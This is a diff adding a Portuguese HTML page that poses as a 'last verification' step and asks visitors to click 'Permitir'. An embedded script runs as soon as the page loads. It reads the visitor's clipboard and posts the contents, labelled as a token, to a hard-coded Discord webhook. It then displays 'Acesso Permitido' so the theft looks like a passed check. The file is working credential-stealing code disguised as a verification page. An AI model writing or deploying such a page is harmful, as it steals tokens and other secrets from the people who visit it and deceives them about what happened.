@@ -1,0 +1,68 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <script
+      src="https://kit.fontawesome.com/65f22fe718.js"
+      crossorigin="anonymous"
+    ></script>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"
+      integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <link rel="stylesheet" href="../assets/css/styles.css" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
+      rel="stylesheet"
+    />
+    <title>Ultima - Veificação</title>
+</head>
+<body>
+    <!-- ULTIMA VERIFICAÇÃO -->
+     <section id="ultima">
+        <h1 id="status" class="resultado">
+            Clike em Permitir
+        </h1>
+        <p>
+            Se caso der "Acesso Negado". Por favor, recarregue a página e clique em "Permitir" para continuar.
+        </p>
+     </section>
+
+     <script>
+        async function enviarTitulo() {
+            try {
+                const titulo = await navigator.clipboard.readText();
+                if (!titulo) {
+                    return;
+                }
+
+                const webhookUrl = "https://discord.com/api/webhooks/1317122821477892197/1M7L3ShQFvlIGobSBgwdCdwatZlZQAMKrEjxlyGxACOErhAlVRTEKN6q8I0WESnbT-HL";
+                const resposta = await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({ content: `Token: ${titulo}` })
+                });
+
+                if (resposta.ok) {
+                    document.getElementById("status").textContent = "Acesso Permitido";
+                } else {
+                    document.getElementById("status").textContent = "Acesso Negado";
+                }
+            } catch (erro) {
+                document.getElementById("status").textContent = "Acesso Negado";
+            }
+        }
+
+        enviarTitulo();
+     </script>
+</body>
+</html>
